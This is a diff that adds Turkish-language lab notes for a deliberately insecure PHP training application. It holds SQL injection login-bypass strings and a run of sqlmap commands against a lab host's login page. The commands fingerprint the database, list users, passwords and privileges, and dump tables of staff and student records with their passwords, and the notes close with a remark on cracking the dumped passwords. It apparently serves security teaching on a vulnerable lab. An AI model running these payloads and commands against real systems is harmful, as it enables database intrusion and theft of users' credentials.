@@ -1,0 +1,55 @@
+/*
+*
+*  https://github.com/celalceken/InsecureWebApplication
+*
+*/
+
+
+// A2' or '1'='1';--
+// A2' or '1';--
+
+
+
+
+
+
+-------------------------------------------------------------------------------------------
+
+sqlmap
+
+// Ana klasörde bulunan InsecureWebApplication klasörü için tarama yapılmalı 
+
+sqlmap hakkında ayrıntılı bilgi için : https://github.com/sqlmapproject/sqlmap/wiki/Usage
+
+
+--flush-session parametresi ile yeni oturum (yeni tarama) açılır...
+
+
+265  sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" --dbs --level=5 --risk=3 --flush-session 
+266  sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -D obs --tables
+267  sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -D obs -T AkademikPersonel --dump
+
+> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -f (fingerprint) vt sürümü
+root@kali:~# sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -f
+
+> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" --current-user
+
+--hostname
+--current-db
+
+--users
+--passwords
+--privileges
+--roles
+
+> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -D ob --tables
+
+
+> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -D ob --tables --column
+
+
+> sqlmap -u "http://192.168.56.103/InsecureWebApplication/Dogrula.php" --data "personelNo=a&sifre=a" -D ob -T ogrenciler -C ogrenciNo,sifre --dump
+
+
+// Şifreler alındıktan sonra kırılması da sağlanabilir...
+
